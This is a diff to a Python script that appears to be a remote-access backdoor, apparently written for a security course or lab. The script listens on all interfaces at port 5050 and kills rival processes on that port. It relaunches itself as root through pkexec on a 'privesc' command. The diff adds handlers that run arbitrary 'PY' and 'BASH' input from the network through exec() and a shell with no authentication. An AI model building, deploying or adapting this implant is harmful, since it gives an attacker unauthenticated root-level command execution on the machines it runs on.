@@ -12,8 +12,8 @@ import subprocess
 import sys
 import time
 import os
-
-
+import contextlib
+import io
 
 THIS_FILE = os.path.realpath(__file__)
 
@@ -30,12 +30,6 @@ def run_command(cmd, shell=True, capture_output=True, **kwargs):
 # listen on port 5050, receive input
 HOST, PORT = "0.0.0.0", 5050
 
-
-# def privesc():
-#     if os.getuid() != 0:
-#         print("Elevating to root...")
-#         subprocess.run(["pkexec", sys.executable, THIS_FILE])
-#         sys.exit()
 def privesc():
     # Check if we are not already root (UID 0)
     if os.getuid() != 0:
@@ -47,7 +41,6 @@ def privesc():
         # Exit this unprivileged instance so the new root one takes over
         sys.exit(0)
  
-
 def kill_others():
     """
     Since a port can only be bound by one program, kill all other programs on this port that we can see.
@@ -95,6 +88,15 @@ def bootstrap_packages():
         # If you need pip install X packages, here, import them now
         import requests
 
+def handle_python_command(user_input):
+    buffer = io.StringIO()
+    try:
+        with contextlib.redirect_stdout(buffer):
+            exec(user_input)
+        output = buffer.getvalue() #AI for capturing output
+        return output if output else "Success!"
+    except Exception as e:
+        return f"Error: {e}" 
 
 
 def handle_conn(conn, addr):
@@ -114,38 +116,31 @@ def handle_conn(conn, addr):
 
         print("received: " + data)
 
+        parts = data.split(" ", 1)
+        command_type = parts[0]
+        command_body = parts[1] if len(parts) > 1 else "" # AI for splitting
+
         #stuff I added -- START
         # Command 1: Privilege Escalation
-        if data == "privesc":
+        if command_type == "privesc":
             print("Running privesc")
             privesc()
+
+        #Command 2: Python 
+        if command_type == "PY":
+            print("Running python")
+            handle_python_command(command_body)
         
+        if command_type == "BASH":
+            run_command(command_body)
 
         # Think VERY carefully about how you will communicate between the client and server
         # You will need to make a custom protocol to transfer commands
-
         try:
             conn.sendall(run_command("whoami").stdout.encode())
             # Process the communication data from 
         except Exception as e:
             conn.sendall(f"error: {e}".encode())
-
-        #stuff I added -- END
-
-        # if data == "privesc":
-        #     print("Running privesc")
-        #     privesc()
-        
-
-        # # Think VERY carefully about how you will communicate between the client and server
-        # # You will need to make a custom protocol to transfer commands
-
-        # try:
-        #     conn.sendall(run_command("whoami").stdout.encode())
-        #     # Process the communication data from 
-        # except Exception as e:
-        #     conn.sendall(f"error: {e}".encode())
-
 
 def main():
     kill_others()
